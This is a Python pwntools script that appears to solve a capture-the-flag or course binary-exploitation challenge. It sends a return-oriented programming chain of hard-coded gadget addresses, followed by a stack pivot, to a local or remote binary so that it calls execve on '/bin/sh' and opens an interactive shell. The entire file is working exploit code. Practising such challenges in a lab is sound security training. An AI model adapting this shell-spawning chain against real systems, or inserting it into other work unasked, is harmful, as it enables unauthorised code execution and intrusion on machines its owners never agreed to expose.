#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 1234

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

def exploit():
    pause()
    offset = 8 # cyclic(420) # cyclic(512) - cannot be exactly the size of input read by fgets # this is the size of "/bin/sh;"

    payload = b'/bin/sh;'
    payload += p64(0x00401162) # pop rdi
    payload += p64(0x00402004) # p64(leak) # &/bin/sh string

    payload += p64(0x0040115a) # mov rax, 0x3b; ret;

    payload += p64(0x00401164) # pop rsi; pop rdx; ret;
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(0x00401167) # syscall;

    pivot = b'A' * 16 + p64(0x0040124c) # add rsp, 8; ret;

    P.sendline(payload)
    P.sendline(pivot)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
